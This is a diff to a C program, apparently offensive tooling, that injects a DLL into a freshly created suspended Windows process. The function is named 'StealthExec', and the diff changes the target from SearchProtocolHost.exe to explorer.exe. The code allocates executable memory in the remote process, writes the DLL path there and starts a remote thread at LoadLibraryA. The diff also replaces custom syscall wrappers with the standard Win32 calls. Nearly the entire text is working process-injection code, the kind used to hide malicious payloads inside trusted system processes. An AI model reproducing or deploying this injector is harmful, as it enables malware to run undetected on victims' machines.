@@ -25,16 +25,16 @@ void StealthExec(HANDLE hProc, const char *dllN)
         printf("[*] Successfully resolve LoadLibraryA.\n");
     }
 
+    memLoc = VirtualAllocEx(hProc, 0, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    /*
     status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (status != 0)
     {
         printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
         return;
     }
-    else
-    {
-        printf("[*] Successfully allocate memory.\n");
-    }
+    */
+    
 
     if (memLoc == NULL)
     {
@@ -43,12 +43,13 @@ void StealthExec(HANDLE hProc, const char *dllN)
     }
     else
     {
-        printf("[*] Successfully allocate memory, BaseAddress is not NULL.\n");
+        printf("[*] Successfully allocate memory.\n");
     }
 
     // Write DLL Path to Remote Process
-    status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
-    if (status != 0)
+    //status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
+    status = WriteProcessMemory(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
+    if (status != 1)
     {
         printf("[!] Memory write failed (Err: 0x%lX).\n", status);
         return;
@@ -59,12 +60,13 @@ void StealthExec(HANDLE hProc, const char *dllN)
     }
     
     // Load Remote DLL
-    hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
+    hThreadRemote = CreateRemoteThreadEx(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL, NULL);
     if (!hThreadRemote)
     {
         printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
         return;
     }
+
     DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000);  // Wait for 5 seconds
     if (waitResult == WAIT_TIMEOUT) {
         printf("[!] Remote thread timed out!\n");
@@ -129,18 +131,18 @@ int main(int argc, char *argv[])
     STARTUPINFOA sInfo = {0};
     PROCESS_INFORMATION pInfo = {0};
 
-    const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
-    const char *procName = "SearchProtocolHost.exe";
+    // const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
+    // const char *procName = "SearchProtocolHost.exe";
     // Also work with explorer.exe
-    // const char* procPath = "C:\\Windows\\explorer.exe";
-    // const char *procName = "Explorer.exe";
+    const char* procPath = "C:\\Windows\\explorer.exe";
+    const char *procName = "Explorer.exe";
 
     if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
     {
         printf("[!] Could not create %s. Err: %lu\n", procName, GetLastError());
         return -1;
     }
-
+    
     printf("[*] Suspended %s created.\n", procName);
 
     // Perform Injection
@@ -148,7 +150,6 @@ int main(int argc, char *argv[])
 
     // Resume Execution
     CloseHandle(pInfo.hProcess);
-    CloseHandle(pInfo.hThread);
     printf("[*] %s is now running.\n", procName);
 
     return 0;
